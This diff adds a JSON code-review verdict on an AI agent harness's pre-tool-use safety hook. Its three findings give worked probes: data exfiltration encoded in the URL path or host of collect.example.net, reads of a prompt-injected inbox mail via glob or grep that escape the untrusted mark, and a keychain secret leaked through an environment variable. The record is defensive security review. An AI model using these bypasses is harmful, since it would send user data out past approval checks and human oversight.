@@ -1,0 +1,43 @@
+{
+  "verdictVersion": 1,
+  "stage": "review",
+  "head": "5d98cb3174e8960970f66009fd4be530492e8b6b",
+  "fbsIds": [
+    "FBS-001"
+  ],
+  "touchedAcIds": [
+    "AC-101-1",
+    "AC-101-2",
+    "AC-1901-1",
+    "AC-1901-2",
+    "AC-1901-3",
+    "AC-1901-4",
+    "AC-1901-5",
+    "AC-1902-1",
+    "AC-1902-2"
+  ],
+  "code": "FINDINGS",
+  "adequacy": "PASS",
+  "findings": [
+    {
+      "id": "F-1",
+      "locus": "build",
+      "acId": "AC-1901-1",
+      "text": "core/hooks/pre-tool-use.py:181 classes a WebFetch as free whenever its address has no query string, and settle (core/hooks/pre-tool-use.py:125-128) passes every free call without reading the job marks, so data carried in a URL path or host leaves the Mac with no yes and no one-job refusal. Probe at 5d98cb3: in a job that read a web page and operator/profile.md, WebFetch https://collect.example.net/QWRhIHJ1bnMgYSBiYWtlcnk and https://QWRhIHJ1bnMgYSBiYWtlcnk.collect.example.net/ each exit 0, while the same data as a query is refused as one job; after only the profile read, a fetch carrying it in the path also exits 0. Breaks AC-1901-1 and AC-1901-3."
+    },
+    {
+      "id": "F-2",
+      "locus": "build",
+      "acId": "AC-1901-3",
+      "text": "core/hooks/pre-tool-use.py:255 marks a read untrusted only when its literal path lies inside workspace/inbox (or is itself quarantined), unlike the private mark at line 253 which counts a containing folder, and lines 226-229 judge Bash words unexpanded; a read that takes in the inbox through a parent folder or a glob leaves the job unmarked. Probe at 5d98cb3: grep -ri \"order\" . from the owner folder (it prints the planted offer.eml line), the Grep tool over workspace in content mode, and cat workspace/inbo?/offer.eml each exit 0 with no untrusted mark; after the profile read a send to someone@example.net is asked (Request r-1) instead of refused as one job, so one yes sends what the injected mail asked for."
+    },
+    {
+      "id": "F-3",
+      "locus": "build",
+      "acId": "AC-1902-2",
+      "text": "core/tools/secret.py:66 puts the secret in whatever variable the session names (line 53 accepts any identifier) and core/tools/secret.py:133-136 hide only whole forms, while core/hooks/pre-tool-use.py:208-213 let the helper run free when the wrapped command is free; a free command that reads that variable as its own setting prints part of the secret. Probe with the tests temporary keychain at 5d98cb3: secret PlumTart7plum, /usr/bin/python3 <installed core>/tools/secret.py run bakery-login --as TZ -- date +%Z: floor exit 0 with no yes, helper stdout \"PlumTart\"."
+    }
+  ],
+  "recordedBy": "reviewer",
+  "recordedAt": "2026-11-07T20:12:34.208Z"
+}
